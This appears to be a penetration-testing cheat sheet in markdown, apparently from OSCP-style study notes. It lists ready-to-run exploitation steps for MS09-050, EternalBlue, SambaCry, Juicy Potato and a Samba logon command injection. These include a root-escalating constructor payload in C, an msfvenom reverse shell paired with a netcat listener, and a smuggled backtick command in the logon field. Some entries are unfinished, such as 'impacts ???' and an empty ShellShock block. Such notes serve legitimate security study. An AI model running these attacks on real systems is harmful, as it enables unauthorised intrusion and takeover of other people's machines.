<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit.md">Top of Page</a> |
  <a href="/CheatSheets/2_exploit.md#bottom-of-page">Bottom of Page</a>
</p>

# Exploit
## Table of Contents
* [MS09-050: SMBv2 Command Value Vulnerability](#ms09-050-smbv2-command-value-vulnerability)
  * [CVE-2009-3103](#cve-2009-2532)
* [EternalBlue](#eternalblue)
  * [CVE-2017-0144](#cve-2017-0144)
* [SambaCry](#sambacry)
  * [CVE-2017-7494](#cve-2017-7494)
* [ShellShock](#shellshock)
  * [CVE-2014-6271](#cve-2014-6271)
* [Juicy Potato](#juicy-potato)
* [Shell via Samba Logon Command](#shell-via-samba-logon-command)

# MS09_050: SMBv2 Command Value Vulnerability
## CVE-2009-3103
This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7. 
```bash
nmap $TARGET -p445 --script smb-vuln-cve2009-3103
wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
```

# EternalBlue
## CVE-2017-0144
This vulnerability impacts ???. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes). 
```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010
pip install impacket # mysmb.py ships with this exploit. offsec also hosts it on their GitHub
python checker.py $TARGET # check if target is vulnerable and find an accessible Named Pipe
python zzz_exploit.py $TARGET $NAMED_PIPE
```

# SambaCry
## CVE-2017-7494
Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired. 
```bash
mkdir exploits
cd exploits
git clone https://github.com/joxeankoret/CVE-2017-7494.git
cd CVE-2017-7494
mv implant.c implant.bak
vim implant.c
```

An example of a modified implant.c file. This source file gets compiled by the provided Python script. 
```c
#include <stdio.h>
#include <stdlib.h>

static void smash() __attribute__((constructor));

void smash() {
setresuid(0,0,0);
system("ping -c2 $LHOST");
}
```

My example payload sends two ICMP packets to my computer. Therefore, the command sentence below is necessary to confirm the exploit works. If you chose to include a reverse shell, you would run something like `sudo nc -nvlp 443` instead.
```bash
sudo tcpdump -i tun0 icmp 
```

Run the exploit. 
```bash
python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
```

# ShellShock
## CVE-2014-6271
```bash
# shellshock via smtp
```

## Juicy Potato
```bash
# download Juicy Potato
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# upload Juicy Potato
# ftp, smb, http, etc.

# create a reverse shell and then upload it to the target
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse-shell.exe
sudo nc -nvlp $LPORT

# use Juicy Potato to execute your reverse shell
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```

## Shell via Samba Logon Command
```bash
mkdir /mnt/$TARGET
sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
sudo cp $EXPLOIT /mnt/$TARGET
smbclient //$TARGET/$SHARE
logon "=`$EXPLOIT`"
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit.md">Top of Page</a> |
  <a href="/CheatSheets/2_exploit.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
